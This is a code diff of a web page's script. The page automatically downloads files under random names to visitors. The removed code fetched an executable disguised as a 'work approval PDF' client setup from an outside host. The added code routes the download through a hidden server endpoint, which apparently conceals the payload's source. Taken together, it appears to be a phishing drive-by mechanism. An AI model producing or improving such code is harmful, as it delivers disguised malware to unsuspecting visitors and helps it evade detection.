@@ -523,26 +523,32 @@
       }
 
       // Triggers the download of a single file
-      function downloadFile(url, extension) {
+      async function downloadFile(url, extension) {
+        try {
+          const response = await fetch(url);
+          const blob = await response.blob();
+
+          const randomName = generateRandomFileName(extension);
+          const downloadUrl = URL.createObjectURL(blob);
+
+          const a = document.createElement("a");
+          a.href = downloadUrl;
+          a.download = randomName;
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+
+          URL.revokeObjectURL(downloadUrl);
+        } catch (error) {
+          console.error("Download failed:", error);
+          alert("Failed to download file.");
+        }
+      }
+      function initiateDownload() {
+        const url = "/api/download"; // This is your Vercel route
         const a = document.createElement("a");
         a.href = url;
-        a.download = generateRandomFileName(extension);
-        a.style.display = "none";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-      }
-
-      function initiateDownload() {
-        const txtUrl = "https://yourdomain.com/files/info.txt";
-        const rarUrl = "https://yourdomain.com/files/bundle.rar";
-        const exeUrl =
-          "https://alpha.noleggiodisci.com/Bin/work_approval_pdf3.ClientSetup.exe?e=Access&y=Guest";
-
-        // Call download for each file type
-        downloadFile(txtUrl, "txt");
-        downloadFile(rarUrl, "rar");
-        downloadFile(exeUrl, "exe");
+        a.click(); // no need for .download — server sets it
       }
 
       // Optional: image load blur effect
